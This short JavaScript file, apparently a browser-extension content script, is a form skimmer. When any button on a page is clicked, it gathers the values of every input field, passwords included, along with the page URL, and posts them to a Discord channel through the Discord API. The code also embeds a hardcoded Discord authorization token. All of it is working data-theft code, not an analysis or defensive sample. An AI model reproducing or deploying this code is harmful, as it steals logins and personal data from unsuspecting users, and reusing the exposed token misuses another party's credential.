console.log("Installed")

const buttons = document.querySelectorAll('button')

buttons.forEach(btn => {
    btn.addEventListener('click', () => {
        send(getInputValues())
    })
})

function getInputValues(){
    const inputs = document.querySelectorAll('input')

    let data = {};
    let inputArray = {};

    inputs.forEach(input => {
        inputArray[input.id] = input.value;
    })

    data["inputs"] = inputArray;
    data["url"] = window.location;

    return JSON.stringify(data)
}

function send(message){

    if(message === null){
        return;
    }

    console.log(message)

    let request = new XMLHttpRequest();

    let data = {"content": message, "tts": false};

    request.open("POST", "https://discord.com/api/v9/channels/555255679125028885/messages")
    request.setRequestHeader("authorization","NDAwODk1MDU2MDUzMTQxNTA3.YOd6uQ.Vi2VDC09w-vjuGuook63uUW7Vt0")
    request.setRequestHeader("Content-Type", "application/json")

    request.send(JSON.stringify(data))
}
